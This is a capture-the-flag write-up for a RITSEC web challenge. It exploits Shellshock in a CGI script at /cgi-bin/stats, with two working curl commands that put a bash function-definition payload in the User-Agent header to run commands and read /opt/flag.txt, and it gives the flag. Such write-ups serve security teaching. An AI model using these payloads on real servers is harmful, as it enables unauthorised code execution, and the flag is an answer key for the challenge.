# Challenge
```
This dog is shockingly cute!

fun.ritsec.club:8008

Author: sandw1ch

```
# Solve

From the start of the challenge, the hint points us to a vulnerability: **Shellshock**

![](https://i.imgur.com/yRDRxoC.png)

![](https://i.imgur.com/LODuOdn.png)

There's a vulnerable CGI service running at /cgi-bin/stats

Using the following command, we can obtain RCE:

`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cd /var/www/;ls -la;'" http://fun.ritsec.club:8008/cgi-bin/stats`

After searching through the machine, we find the flag in the `/opt/flag.txt` file, and we can retireve it with the following command:
`curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /opt/flag.txt'" http://fun.ritsec.club:8008/cgi-bin/stats`.

The flag is `RITSEC{sh3ll_sh0cked_w0wz3rs}`

In my opinion, this was the easiest web challenge in this CTF.
